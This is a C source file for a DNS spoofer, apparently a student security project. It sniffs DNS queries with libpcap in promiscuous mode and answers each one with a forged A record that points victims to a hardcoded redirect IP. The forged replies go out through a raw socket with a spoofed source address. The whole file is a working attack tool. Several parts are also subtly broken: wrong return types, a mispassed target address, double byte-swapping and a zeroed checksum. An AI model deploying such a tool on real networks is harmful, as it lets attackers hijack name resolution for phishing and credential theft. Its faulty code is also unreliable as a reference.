#include <pcap.h>
#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include <sys/types.h>
#include <netdb.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "header.h"
#include "dns.h"

#define BUF_SIZE 1100

#define SNAPLEN 800
#define MAX_PCK_SIZE 1000
#define PCAP_READ_TIMEOUT_MS 1

void print_buffer(u_int8_t* buffer, int size);

// get this machine dns server address
void get_dns_server_ip(char* dns_ip);

void get_filter_expr(char* filter_expr, const char* dns_ip);
void begin_sniffing(const char* device, const char* filter_expr, pcap_handler callback);
void process_packet(u_int8_t *args, const struct pcap_pkthdr *header, const u_int8_t *buffer);
int fill_raw_dns_packet(uint8_t *buffer, struct sockaddr* target);
void send_raw_dns_packet(int size, struct sockaddr* target);

char dns_dest_ip[20] = "all";
char redirect_ip[20] = "129.104.221.104";

char dev_name[100] = "any";
const int header_offset = 16; // default for linux any device, replacing ethernet header

// raw socket
int raw_socket;

// packet to send
u_int8_t packet[BUF_SIZE];

//to keep the information received on each dns query
res_record answers[ANS_SIZE], auth[ANS_SIZE], addit[ANS_SIZE];
query queries[ANS_SIZE];

int main(int argc, char** argv) {
    if (argc > 3) {
        printf("Usage : dns_spoofer [redirect_ip] [dns_dest_ip]/all\n");
        return 1;
    }
    if (argc == 1) {
        printf("Using default values\n");
        printf("Using default returned ip : %s\n", redirect_ip);
        printf("Using default dns ip : %s\n", dns_dest_ip);
    }
    if (argc == 2) {
        strncpy(redirect_ip, argv[1], sizeof(redirect_ip));
        printf("Using default dns ip : %s\n", dns_dest_ip);
    }
    if (argc == 3) {
        strncpy(dns_dest_ip, argv[2], sizeof(dns_dest_ip));
    }
    
    // setting up raw socket
    raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int hincl = 1;                  /* 1 = on, 0 = off */
    setsockopt(raw_socket, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));
	if(raw_socket < 0)
	{
		perror("Error creating raw socket ");
		exit(1);
	}


    // Constructing filter
    char filter_expr[100];
    get_filter_expr(filter_expr, dns_dest_ip);

    // begin sniffing and sending faked dns queries
    begin_sniffing(dev_name, filter_expr, process_packet);
    

	return 0;

}


void get_dns_server_ip(char* dns_ip) {
    FILE* file;
    char line[256];
    if ((file = fopen("/etc/resolv.conf", "r")) == NULL) {
        printf("Failed to read dns servers' list from /etc/resolv.conf\n");
        dns_ip = NULL;
        return;
    }
    while(fgets(line, 256, file)) {
        if(strncmp(line, "nameserver", 10) == 0) {
            strcpy(dns_ip, line + 11);
            dns_ip[strlen(dns_ip) - 1] = '\0';
            return;
        }
    }
    dns_ip = NULL;
}

void get_filter_expr(char* filter_expr, const char* dns_ip) {
    const char dns_port[] = "udp port 53";
    const char dns_ip_str[] = " and dst ";

    strcpy(filter_expr, dns_port);
    if (strcmp(dns_ip, "all") != 0) {
        strcat(filter_expr, dns_ip_str);
        strncat(filter_expr, dns_ip, 30); // just to be sure we're not taking too much data
    }
}

void begin_sniffing(const char* device, const char* filter_expr, pcap_handler callback) {
    pcap_t *handle;
    char err_buf[PCAP_ERRBUF_SIZE];

    strcpy(dev_name, device);
	bpf_u_int32 net_ip, mask;

	//look up the chosen device
	int ret = pcap_lookupnet(dev_name, &net_ip, &mask, err_buf);
	if(ret < 0)
	{
		fprintf(stderr, "Error looking up net: %s \n", dev_name);
		exit(1);
	}

	struct sockaddr_in addr;
	addr.sin_addr.s_addr = net_ip;
	char ip_char[100];
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	printf("NET address: %s\n", ip_char);

	addr.sin_addr.s_addr = mask;
	memset(ip_char, 0, 100);
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	printf("Mask: %s\n", ip_char);

	//open the device
	//	   snaplen - maximum size of packets to capture in bytes
	//	   promisc - set card in promiscuous mode?
	//	   to_ms   - time to wait for packets in miliseconds before read
	//	   times out
	//	   errbuf  - if something happens, place error string here
	//	   Note if you change "prmisc" param to anything other than zero, you will
	//	   get all packets your device sees, whether they are intendeed for you or
	//	   not!! Be sure you know the rules of the network you are running on
	//	   before you set your card in promiscuous mode!!
    
    handle = pcap_open_live(dev_name, SNAPLEN, 1, PCAP_READ_TIMEOUT_MS, err_buf);

	if(handle == NULL)
	{
		fprintf(stderr, "Unable to open device %s: %s\n", dev_name, err_buf);
		exit(1);
	}

    // set low buffer size for fast capture
    pcap_set_buffer_size(handle, MAX_PCK_SIZE);

    // Now setting up rule
    struct bpf_program fp;		/* The compiled filter expression */

    if (pcap_compile(handle, &fp, filter_expr, 0, net_ip) == -1) {
		 fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_expr, pcap_geterr(handle));
		 return(2);
	 }
	 if (pcap_setfilter(handle, &fp) == -1) {
		 fprintf(stderr, "Couldn't install filter %s: %s\n", filter_expr, pcap_geterr(handle));
		 return(2);
	 }

    printf("Device %s is opened. Begin sniffing with filter \"%s\" ...\n", dev_name, filter_expr);

	//Put the device in sniff loop
	pcap_loop(handle , -1 , callback , NULL);
	pcap_close(handle);
}

void process_packet(u_int8_t *args, const struct pcap_pkthdr *header, const u_int8_t *buffer) {
    // DNS packet is usually sent over UDP, if its size is small enough.
    // structure of packet is : ethernet header, ip header, udp header and dns section.

    //Get the IP Header part of this packet , excluding the ethernet header
    struct iphdr *iph;
    iph = (struct iphdr*)(buffer + header_offset);

    // we verify that it is a dns query
    dns_header *dns = ((uint8_t*)iph) + sizeof(struct udphdr) + sizeof(struct iphdr);
    if (dns->qr) {
        // no : it is a response
        return;
    }

    struct sockaddr target;
    int n = fill_raw_dns_packet(iph, &target);

    // send packet
    send_raw_dns_packet(n, &target);
}

// sending packet from dns query in buffer. Returns packet length
int fill_raw_dns_packet(uint8_t *buffer, struct sockaddr* target) {

    //IP header pointer received
	struct iphdr *iph_recv = (struct iphdr *)buffer;

	//UDP header pointer received
	struct udphdr *udph_recv = (struct udphdr *)(buffer + sizeof(struct iphdr));

	//data section pointer received
	uint8_t* data_recv = buffer + sizeof(struct iphdr) + sizeof(struct udphdr);

    // helper pointer to packet 
    //IP header pointer to send
	struct iphdr *iph_send = (struct iphdr *)packet;

	//UDP header pointer to send
	struct udphdr *udph_send = (struct udphdr *)(packet + sizeof(struct iphdr));
    struct pseudo_udp_header psh;

	//data section pointer to send
	uint8_t *data_send = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    
    // first fill data
    // retrieve rest of information from data
	//parse_dns_query(data_recv, queries, answers, auth, addit, NULL);
    
/***********************DNS RESPONSE*******************************/
    int buf_pos = 0;

    //begin building the dns header
	memcpy(data_send, data_recv, sizeof(dns_header));
	dns_header *dns = (dns_header*)data_send;
	dns->qr = 1;
	dns->an_count = htons(1);

	buf_pos += sizeof(dns_header);

	// query part. copy name, then set A, IN
	uint8_t *query = data_send + buf_pos;
    uint8_t *name = data_recv + sizeof(dns_header);
	int length_name = strlen(name) + 1;
    // just copy from data received
    memcpy(query, name, length_name);
	//build_name_section(query, queries->qname, &length_name);
	query += length_name;
	((question*)query)->qtype = htons(TYPE_A);
	((question*)query)->qclass = htons(CLASS_IN);

	buf_pos += length_name + sizeof(question);

	// Now building answer part. Same start for the beginning
	// name
	uint8_t *answer = data_send + buf_pos;
	//build_name_section(answer, queries->qname, &length_name);
    memcpy(answer, name, length_name);
	answer += length_name;
	// type and class
	r_element* answer_element = answer;
	answer_element->type = htons(TYPE_A);
	answer_element->_class = htons(CLASS_IN);
	answer_element->ttl = htonl(86400); // a day yay
	answer_element->rdlength = htons(4);
	
	buf_pos += length_name + 10; // attention ! seulement 10 octets pour sizeof(r_element)

	// and now copy ip
	uint32_t* ip_data = data_send + buf_pos;
	inet_pton(AF_INET, redirect_ip, ip_data);

	buf_pos += sizeof(uint32_t);

/***************************IP HEADER********************************/

	iph_send->tos = iph_recv->tos;
	iph_send->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + buf_pos;
	iph_send->id = 0;
	iph_send->frag_off = 0;
	iph_send->version = 4;
	iph_send->ihl = 5;
	iph_send->ttl = ~0;
	iph_send->protocol = 17;
	iph_send->check = htons(checksum(iph_send, 9));
    iph_send->saddr = iph_recv->daddr;
    iph_send->daddr = iph_recv->saddr;

/***************************UDP HEADER********************************/

	//fill the UDP header
	udph_send->source = udph_recv->dest;
	udph_send->dest = udph_recv->source;
	udph_send->len = htons(sizeof(struct udphdr) + buf_pos);

	// fill pseudo header
    /*psh.source_address = iph_send->saddr;
    psh.dest_address = iph_send->daddr;
	psh.placeholder = 0;
	psh.protocol = 17;
	psh.udp_length = udph_send->len;

	// set data for checksum of udp packet
	int virtual_udp_packet_size = sizeof(struct udphdr) + sizeof(struct pseudo_udp_header) + buf_pos;
	u_int8_t header_data[virtual_udp_packet_size];
	memcpy(header_data, &psh, sizeof(struct pseudo_udp_header));
	memcpy(header_data + sizeof(struct pseudo_udp_header), udph_send, sizeof(struct udphdr));
	memcpy(header_data + sizeof(struct pseudo_udp_header) + sizeof(struct udphdr), data_send, buf_pos);
	udph_send->check = (checksum(&header_data, virtual_udp_packet_size));*/
    
    udph_send->check = 0;

    // setup target destination for sendto function
	struct sockaddr_in *server_v4 = (struct sockaddr_in *)(&target);
	server_v4->sin_family = AF_INET;
	server_v4->sin_port = htons(udph_send->dest);
	server_v4->sin_addr.s_addr = iph_send->daddr;

    // ok return size of packet
    return sizeof(struct iphdr) + sizeof(struct udphdr) + buf_pos;
}

void send_raw_dns_packet(int size, struct sockaddr* target) {
    //send the packet
	if(sendto(raw_socket, packet, size, 
			 0, target, sizeof(struct sockaddr)) == -1) {
		fprintf(stderr, "Could not send data : %s\n", strerror(errno));
        return 1;
	}
}

void print_buffer(u_int8_t* buffer, int size) {
	for(int i = 0; i < size; i++) {
		printf("%x ", buffer[i]);
		if (i % 8 == 7) printf("\n");
	}
	printf("\n");
}